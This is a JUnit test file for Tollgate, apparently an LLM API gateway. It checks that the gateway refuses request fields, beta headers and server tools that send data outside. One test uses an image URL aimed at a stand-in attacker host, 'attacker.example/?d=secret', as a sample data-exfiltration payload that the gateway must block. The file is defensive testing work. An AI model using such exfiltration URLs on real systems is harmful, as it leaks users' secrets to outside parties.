package io.github.jamalakhras.tollgate.gateway;

import static org.assertj.core.api.Assertions.assertThat;

import io.github.jamalakhras.tollgate.core.audit.Intent;
import io.github.jamalakhras.tollgate.core.audit.Outcome;
import io.github.jamalakhras.tollgate.core.money.Money;
import io.github.jamalakhras.tollgate.core.policy.Decision;
import io.github.jamalakhras.tollgate.core.policy.GuardStep;
import io.github.jamalakhras.tollgate.core.policy.Refusal;
import io.github.jamalakhras.tollgate.providers.FakeProvider;
import java.math.BigDecimal;
import java.net.http.HttpResponse;
import java.util.Currency;
import org.junit.jupiter.api.Test;

class RequestFeaturesTest extends GatewayTestSupport {

    private static final String OK = "{\"id\":\"1\",\"choices\":[]}";

    private HttpResponse<String> chat(String fields) throws Exception {
        return chat(KEY, "{\"model\":\"qwen3\"," + fields + "}");
    }

    @Test
    void refusesAFieldThatSendsDataElsewhereAndAuditsTheRefusal() throws Exception {
        HttpResponse<String> response = chat("\"messages\":[],\"web_search_options\":{}");

        assertThat(response.statusCode()).isEqualTo(403);
        assertThat(response.body())
                .contains("\"code\":\"policy_denied\"")
                .contains("The field 'web_search_options' is not allowed: it sends searches to a search engine");
        assertThat(PROVIDER.received()).isEmpty();
        Intent intent = intentOf(response);
        assertThat(intent.decision())
                .isEqualTo(Decision.deny(
                        Refusal.POLICY_DENIED,
                        "The field 'web_search_options' is not allowed: it sends searches to a search engine"));
        assertThat(intent.steps()).extracting(GuardStep::guard).containsExactly("request-features");
    }

    @Test
    void refusesFieldsItHasNotReviewed() throws Exception {
        HttpResponse<String> response = chat("\"messages\":[],\"prediction\":{}");

        assertThat(response.statusCode()).isEqualTo(403);
        assertThat(response.body()).contains("The field 'prediction' is not one Tollgate has reviewed");
    }

    @Test
    void forwardsTheExtraFieldsALocalProviderAccepts() throws Exception {
        PROVIDER.respond(200, OK);

        HttpResponse<String> listed = chat("\"messages\":[],\"top_k\":20");
        HttpResponse<String> unlisted = chat("\"messages\":[],\"min_p\":0.05");

        assertThat(listed.statusCode()).isEqualTo(200);
        assertThat(PROVIDER.received().getFirst().body()).contains("\"top_k\":20");
        assertThat(unlisted.statusCode()).isEqualTo(403);
        assertThat(unlisted.body()).contains("The field 'min_p' is not one Tollgate has reviewed");
    }

    @Test
    void refusesImagesByUrlButForwardsInlineImages() throws Exception {
        PROVIDER.respond(200, OK);

        HttpResponse<String> remote = chat("\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"image_url\","
                + "\"image_url\":{\"url\":\"https://attacker.example/?d=secret\"}}]}]");
        HttpResponse<String> inline = chat("\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"image_url\","
                + "\"image_url\":{\"url\":\"data:image/png;base64,AA\"}}]}]");

        assertThat(remote.statusCode()).isEqualTo(403);
        assertThat(remote.body())
                .contains(
                        "This request uses images by URL, which this policy does not allow for data class 'internal'");
        assertThat(inline.statusCode()).isEqualTo(200);
        assertThat(PROVIDER.received()).hasSize(1);
    }

    @Test
    void refusesBetaHeadersInTheAnthropicFormat() throws Exception {
        HttpResponse<String> response = messages(
                KEY,
                "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[]}",
                "anthropic-beta",
                "mcp-client-2025-11-20");

        assertThat(response.statusCode()).isEqualTo(403);
        assertThat(response.body())
                .contains("\"type\":\"permission_error\"")
                .contains("The anthropic-beta 'mcp-client-2025-11-20' is not allowed");
        assertThat(PROVIDER.received()).isEmpty();
    }

    @Test
    void forwardsUnreviewedFieldsAndBetasWhereThePolicyAllowsThem() throws Exception {
        PROVIDER.respond(200, "{\"id\":\"msg_1\",\"type\":\"message\",\"content\":[]}");

        HttpResponse<String> response = messages(
                CODER_KEY,
                "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[],\"context_management\":{}}",
                "anthropic-beta",
                "interleaved-thinking-2025-05-14");

        assertThat(response.statusCode()).isEqualTo(200);
        FakeProvider.Received forwarded = PROVIDER.received().getFirst();
        assertThat(forwarded.headers().get("Anthropic-beta")).containsExactly("interleaved-thinking-2025-05-14");
        assertThat(forwarded.body()).contains("\"context_management\":{}");
    }

    @Test
    void stillRefusesWhatNoPolicyCanAllow() throws Exception {
        HttpResponse<String> response = messages(
                CODER_KEY,
                "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[]}",
                "anthropic-beta",
                "web-fetch-2025-09-10");

        assertThat(response.statusCode()).isEqualTo(403);
        assertThat(PROVIDER.received()).isEmpty();
    }

    @Test
    void allowsAFeatureOnlyForTheDataClassesThePolicyNames() throws Exception {
        PROVIDER.respond(200, OK);
        String remoteImage = "{\"model\":\"qwen3\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":"
                + "\"image_url\",\"image_url\":{\"url\":\"https://example.com/chart.png\"}}]}]}";

        HttpResponse<String> internal = chat(CODER_KEY, remoteImage);
        HttpResponse<String> confidential = chat(CODER_KEY, remoteImage, Gateway.DATA_CLASS_HEADER, "confidential");

        assertThat(internal.statusCode()).isEqualTo(200);
        assertThat(confidential.statusCode()).isEqualTo(403);
        assertThat(confidential.body()).contains("not allow for data class 'confidential'");
    }

    @Test
    void capsAndChargesWebSearchWherePolicyAllowsIt() throws Exception {
        PROVIDER.respond(
                200,
                "{\"id\":\"msg_1\",\"type\":\"message\",\"content\":[],\"usage\":{\"input_tokens\":100,"
                        + "\"output_tokens\":50,\"server_tool_use\":{\"web_search_requests\":2}}}");
        String search = "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[],"
                + "\"tools\":[{\"type\":\"web_search_20250305\",\"name\":\"web_search\",\"max_uses\":10}]}";

        HttpResponse<String> allowed = messages(CODER_KEY, search);
        HttpResponse<String> refused = messages(KEY, search);

        assertThat(allowed.statusCode()).isEqualTo(200);
        assertThat(PROVIDER.received().getFirst().body()).contains("\"max_uses\":3");
        Outcome outcome = outcomeOf(allowed);
        assertThat(outcome.cost()).isEqualTo(Money.of(new BigDecimal("0.02105"), Currency.getInstance("USD")));
        assertThat(refused.statusCode()).isEqualTo(403);
        assertThat(refused.body()).contains("This request uses web search, which this policy does not allow");
    }

    @Test
    void refusesServerToolsButForwardsClientTools() throws Exception {
        PROVIDER.respond(200, "{\"id\":\"msg_1\",\"type\":\"message\",\"content\":[]}");
        String request = "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[],\"tools\":[%s]}";

        HttpResponse<String> server =
                messages(KEY, request.formatted("{\"type\":\"web_fetch_20250910\",\"name\":\"web_fetch\"}"));
        HttpResponse<String> client = messages(KEY, request.formatted("{\"name\":\"emit\",\"input_schema\":{}}"));

        assertThat(server.statusCode()).isEqualTo(403);
        assertThat(server.body()).contains("The tool type 'web_fetch_20250910' is not allowed");
        assertThat(client.statusCode()).isEqualTo(200);
    }
}
